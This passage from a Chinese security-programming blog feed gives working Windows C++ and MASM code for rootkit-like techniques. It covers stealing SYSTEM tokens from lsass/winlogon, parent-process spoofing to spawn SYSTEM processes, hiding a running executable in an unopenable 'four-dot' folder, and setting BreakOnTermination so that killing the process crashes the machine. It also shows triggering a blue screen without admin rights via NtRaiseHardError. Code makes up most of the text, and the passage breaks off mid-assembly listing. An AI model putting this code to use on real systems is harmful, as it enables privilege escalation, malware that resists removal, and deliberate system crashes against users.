class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br>    HANDLE hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32First</span>(hSnapshot, &amp;pe)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == <span class="hljs-built_in">wcscmp</span>(pe.szExeFile, <span class="hljs-string">L&quot;lsass.exe&quot;</span>)) &#123;<br>                idL = pe.th32ProcessID;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == <span class="hljs-built_in">wcscmp</span>(pe.szExeFile, <span class="hljs-string">L&quot;winlogon.exe&quot;</span>)) &#123;<br>                idW = pe.th32ProcessID;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(hSnapshot, &amp;pe));<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hSnapshot);<br><br>    <span class="hljs-comment">//获取句柄，先试lsass再试winlogon</span><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, idL);<br>    <span class="hljs-keyword">if</span> (!hProcess)hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, idW);<br>    HANDLE hTokenx;<br>    <span class="hljs-comment">//获取令牌</span><br>    <span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_DUPLICATE, &amp;hTokenx);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-comment">//复制令牌</span><br>    HANDLE token;<br>    <span class="hljs-built_in">DuplicateTokenEx</span>(hTokenx, MAXIMUM_ALLOWED, <span class="hljs-literal">NULL</span>, SecurityIdentification, TokenPrimary, &amp;token);<br>    <span class="hljs-built_in">CloseHandle</span>(hTokenx);<br>    BOOL ret = <span class="hljs-built_in">ImpersonateLoggedOnUser</span>(token);<br>    <span class="hljs-built_in">CloseHandle</span>(token);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="服务项"><a href="#服务项" class="headerlink" title="服务项"></a>服务项</h1><p>类似计划任务，服务项同样可以指定SYSTEM用户，不过需要被运行程序实现一套服务接口（<a href="https://blog.csdn.net/sxr__nc/article/details/115582049">Windows服务二三事——编写Windows服务</a>）或者用其他的方法绕过（<a href="https://learn.microsoft.com/zh-cn/troubleshoot/windows-client/setup-upgrade-and-drivers/create-user-defined-service">创建用户定义的服务</a>），比较麻烦</p><h1 id="父进程欺骗"><a href="#父进程欺骗" class="headerlink" title="父进程欺骗"></a>父进程欺骗</h1><p>参考<a href="https://mp.weixin.qq.com/s/qgs3SJCa53M4sTke7EeC8A">父进程欺骗–DidierStevens</a></p><p><img src="/articles/run_as_system/2.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">EnableDebugPriv</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE hToken;<br>    LUID sedebugnameValue;<br>    TOKEN_PRIVILEGES tkp;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue)) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>    tkp.Privileges[<span class="hljs-number">0</span>].Luid = sedebugnameValue;<br>    tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tkp, <span class="hljs-keyword">sizeof</span> tkp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">SelectMyParent</span><span class="hljs-params">(LPWSTR CommandLine, DWORD dwParentID)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">EnableDebugPriv</span>()) &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    SIZE_T cbAttributeListSize = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">InitializeProcThreadAttributeList</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;cbAttributeListSize);<br><br>    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)<span class="hljs-built_in">HeapAlloc</span>(<span class="hljs-built_in">GetProcessHeap</span>(), <span class="hljs-number">0</span>, cbAttributeListSize);<br>    <span class="hljs-keyword">if</span> (!pAttributeList)&#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">InitializeProcThreadAttributeList</span>(pAttributeList, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;cbAttributeListSize)) &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    HANDLE hParentProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwParentID);<br>    <span class="hljs-keyword">if</span> (!hParentProcess)&#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">UpdateProcThreadAttribute</span>(pAttributeList, <span class="hljs-number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;hParentProcess, <span class="hljs-built_in">sizeof</span>(HANDLE), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))&#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    PROCESS_INFORMATION pi = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    STARTUPINFOEXW sie = &#123; <span class="hljs-number">0</span> &#125;;<br>    sie.StartupInfo.cb = <span class="hljs-built_in">sizeof</span>(STARTUPINFOEXW);<br>    sie.lpAttributeList = pAttributeList;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreateProcessW</span>(<span class="hljs-literal">NULL</span>,<br>        CommandLine,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        FALSE,<br>        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        &amp;sie.StartupInfo,<br>        &amp;pi))<br>    &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">//WaitForSingleObject(pi.hProcess, INFINITE);</span><br>    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(hParentProcess);<br><br>    <span class="hljs-built_in">DeleteProcThreadAttributeList</span>(pAttributeList);<br>    <span class="hljs-built_in">HeapFree</span>(<span class="hljs-built_in">GetProcessHeap</span>(), HEAP_NO_SERIALIZE, sie.lpAttributeList);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">CreateSystemProcess_SelectParent</span><span class="hljs-params">(LPCWSTR CommandLine)</span> </span>&#123;<br>    DWORD idL;<br>    PROCESSENTRY32W pe = &#123;<span class="hljs-number">0</span>&#125;;<br>    pe.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32W);<br>    HANDLE hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32FirstW</span>(hSnapshot, &amp;pe)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == <span class="hljs-built_in">wcscmp</span>(pe.szExeFile, <span class="hljs-string">L&quot;lsass.exe&quot;</span>)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32NextW</span>(hSnapshot, &amp;pe));<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hSnapshot);<br><br>    <span class="hljs-comment">//我这里懒省事了，当心长路径溢出！！</span><br>    <span class="hljs-type">wchar_t</span> temp[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-built_in">wcscpy_s</span>(temp, CommandLine);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">SelectMyParent</span>(temp, pe.th32ProcessID);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">CreateSystemProcess_SelectParent</span>(<span class="hljs-string">L&quot;C:\\Users\\ADMIN\\Desktop\\Project1.exe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="番外：提权TrustedInstaller"><a href="#番外：提权TrustedInstaller" class="headerlink" title="番外：提权TrustedInstaller"></a>番外：提权TrustedInstaller</h1><p>TrustedInstaller是系统最高权限（比SYSTEM还高）</p><p>提权方法1：提权SYSTEM -&gt; 启动TrustedInstaller服务 -&gt; 打开TrustedInstaller.exe进程，获取token -&gt; 使用<code>CreateProcessWithTokenW</code>创建新进程或使用<code>ImpersonateLoggedOnUser</code>提权自身</p><p>提权方法2：提权SYSTEM -&gt; 启动TrustedInstaller服务 -&gt; 创建新进程，且父进程设置为TrustedInstaller.exe</p><p>显而易见，除了启动TrustedInstaller服务以外，其他操作都是换汤不换药</p><p><del>既然换汤不换药，那代码就不写了(懒)…</del></p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在3环实现类似0环rootkit的功能</title>
    <link href="/articles/ring3_rootkit/"/>
    <url>/articles/ring3_rootkit/</url>
    
    <content type="html"><![CDATA[<h1 id="强制删除运行中的exe文件"><a href="#强制删除运行中的exe文件" class="headerlink" title="强制删除运行中的exe文件"></a>强制删除运行中的exe文件</h1><p>创建具有特殊性质的四点文件夹，类似MagicDot</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">VOID <span class="hljs-title">ForceDeleteW</span><span class="hljs-params">(LPCWSTR file)</span> </span>&#123;<br>    <span class="hljs-comment">//获取 %temp% 路径</span><br>    TCHAR TempPath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetTempPathW</span>(MAX_PATH, TempPath)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//生成随机字符串，创建临时文件夹</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> seed_str[] = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>));<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">wcslen</span>(TempPath);<br>    <span class="hljs-type">int</span> i = len;<br>    <span class="hljs-keyword">for</span> (; i &lt; len + <span class="hljs-number">10</span>; ++i) &#123;<br>        TempPath[i] = seed_str[(<span class="hljs-built_in">rand</span>() % (<span class="hljs-keyword">sizeof</span> seed_str - <span class="hljs-number">1</span>))];<br>    &#125;<br>    TempPath[i] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">CreateDirectoryW</span>(TempPath, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">wcscat_s</span>(TempPath, <span class="hljs-string">L&quot;\\....\\&quot;</span>);<br>    <span class="hljs-built_in">CreateDirectoryW</span>(TempPath, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">//将运行中的exe文件移动进去，就可达到强删的效果</span><br>    TCHAR TempFile[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-built_in">wcscpy_s</span>(TempFile, TempPath);<br>    <span class="hljs-built_in">wcscat_s</span>(TempFile, <span class="hljs-string">L&quot;temp&quot;</span>);<br><br>    <span class="hljs-built_in">MoveFileW</span>(file, TempFile);<br>    <span class="hljs-built_in">MoveFileW</span>(TempPath, TempFile);<br>&#125;<br></code></pre></td></tr></table></figure><p>删除后任务管理器无法定位源文件</p><p><img src="/articles/ring3_rootkit/1.png"></p><p>启动项同样无法定位，打开所在目录会直接打开此电脑</p><p><img src="/articles/ring3_rootkit/7.png"></p><p>资源管理器无法打开和删除四点文件夹，除非使用专业磁盘工具</p><p><img src="/articles/ring3_rootkit/8.png"></p><p><img src="/articles/ring3_rootkit/3.png"></p><h1 id="BreakOnTermination进程保护"><a href="#BreakOnTermination进程保护" class="headerlink" title="BreakOnTermination进程保护"></a>BreakOnTermination进程保护</h1><p>进程结束后蓝屏</p><p><img src="/articles/ring3_rootkit/4.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">BOOL <span class="hljs-title">EnableDebugPriv</span><span class="hljs-params">()</span> </span>&#123;<br>HANDLE hToken;<br>LUID sedebugnameValue;<br>TOKEN_PRIVILEGES tkp;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<br><span class="hljs-keyword">return</span> FALSE;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue)) &#123;<br><span class="hljs-built_in">CloseHandle</span>(hToken);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>tkp.Privileges[<span class="hljs-number">0</span>].Luid = sedebugnameValue;<br>tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tkp, <span class="hljs-keyword">sizeof</span> tkp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &#123;<br><span class="hljs-built_in">CloseHandle</span>(hToken);<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">ProcessProtect</span><span class="hljs-params">(DWORD pid, BOOL enable)</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span></span><br><span class="hljs-function"><span class="hljs-params">(__stdcall* MyNtSetInformationProcess)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">IN HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">IN PROCESS_INFORMATION_CLASS ProcessInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">IN PVOID ProcessInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">IN ULONG ProcessInformationLength</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">EnableDebugPriv</span>()) &#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>HANDLE h = pid ? <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, pid) : <span class="hljs-built_in">GetCurrentProcess</span>();<br><span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>HMODULE hNtdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hNtdll &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>MyNtSetInformationProcess ntSetProcess = (MyNtSetInformationProcess)<span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;NtSetInformationProcess&quot;</span>);<br><span class="hljs-keyword">if</span> (ntSetProcess &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NT_SUCCESS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">NT_SUCCESS</span>(<span class="hljs-built_in">ntSetProcess</span>(h, (PROCESS_INFORMATION_CLASS)<span class="hljs-number">29</span>, &amp;enable, <span class="hljs-number">4</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>一定要监听关机事件（<code>WM_QUERYENDSESSION</code>），在用户关机前取消保护，否则会直接蓝屏</p><h1 id="3环触发蓝屏"><a href="#3环触发蓝屏" class="headerlink" title="3环触发蓝屏"></a>3环触发蓝屏</h1><p>3环触发蓝屏，<strong>且无需管理员权限</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">BOOL <span class="hljs-title">BSOD</span><span class="hljs-params">(DWORD code = <span class="hljs-number">0xC0000005</span>)</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* pdef_RtlAdjustPrivilege)</span><span class="hljs-params">(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* pdef_NtRaiseHardError)</span><span class="hljs-params">(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response)</span></span>;<br><br>HMODULE ntdll = <span class="hljs-built_in">LoadLibraryW</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (!ntdll) <span class="hljs-keyword">return</span> FALSE;<br>pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)<span class="hljs-built_in">GetProcAddress</span>(ntdll, <span class="hljs-string">&quot;RtlAdjustPrivilege&quot;</span>);<br>pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)<span class="hljs-built_in">GetProcAddress</span>(ntdll, <span class="hljs-string">&quot;NtRaiseHardError&quot;</span>);<br><span class="hljs-keyword">if</span> (!RtlAdjustPrivilege || !NtRaiseHardError) <span class="hljs-keyword">return</span> FALSE;<br><br>BOOLEAN tmp1;<br>ULONG tmp2;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NT_SUCCESS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">NT_SUCCESS</span>(<span class="hljs-built_in">RtlAdjustPrivilege</span>(<span class="hljs-number">19</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;tmp1)) &amp;&amp; <span class="hljs-built_in">NT_SUCCESS</span>(<span class="hljs-built_in">NtRaiseHardError</span>(code, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, &amp;tmp2)));<br>&#125;<br></code></pre></td></tr></table></figure><p>再贴个MASM实现，编译出来压缩一下就1585字节大</p><p><img src="/articles/ring3_rootkit/9.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">;ml /c /coff BSOD.asm</span><br><span class="hljs-comment">;link /subsystem:windows BSOD.obj</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.486</span><br><span class="hljs-meta">.model</span> flat, stdcall<br><span class="hljs-meta">option</span> casemap :none<br>includelib \masm32\lib\kernel32<span class="hljs-number">.</span>lib<br>includelib \masm32\lib\masm32<span class="hljs-number">.</span>lib<br><br>include \masm32\include\kernel32<span class="hljs-number">.</span><span class="hljs-keyword">inc</span><br>include \masm32\include\windows<span class="hljs-number">.</span><span class="hljs-keyword">inc</span><br>include \masm32\include\masm32<span class="hljs-number">.</span><span class="hljs-keyword">inc</span><br>include \masm32\macros\macros<span class="hljs-number">.</span>asm<br><span class="hljs-meta"></span><br><span class="hljs-meta">.data</span><br><br>NTDLLstr <span class="hljs-built_in">db</span> <span class="hljs-string">&quot;ntdll.dll&quot;</span>,<span class="hljs-number">0</span><br>AdjustStr <span class="hljs-built_in">db</span> <span class="hljs-string">&quot;RtlAdjustPrivilege&quot;</span>,<span class="hljs-number">0</span><br>RaiseStr <span class="hljs-built_in">db</span> <span class="hljs-string">&quot;NtRaiseHardError&quot;</span>,<span class="hljs-number">0</span><br><br>pA <span class="hljs-built_in">dd</span> <span class="hljs-number">00000000</span><br>tmp <span class="hljs-built_in">dd</span> <span class="hljs-number">00000000</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.code</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span><br>    fn LoadLibraryA,offset NTDLLstr<br><br>    fn GetModuleHandleA,offset NTDLLstr<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">eax</span><br><br>fn GetProcAddress,<span class="hljs-built_in">ebx</span>,offset AdjustStr<br>    <span class="hljs-keyword">mov</span> pA,<span class="hljs-built_in">eax</span><br><br>fn GetProcAddress,<span class="hljs-built_in">ebx</span>,offset RaiseStr<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">eax</span><br><br><span class="hljs-keyword">push</span> offset tmp<br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">19</span><br><span class="hljs-keyword">call</span> pA<br><br><span class="hljs-keyword">push</span> offset tmp<br><span class="hljs-keyword">push</span> <span class="hljs-number">6</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span 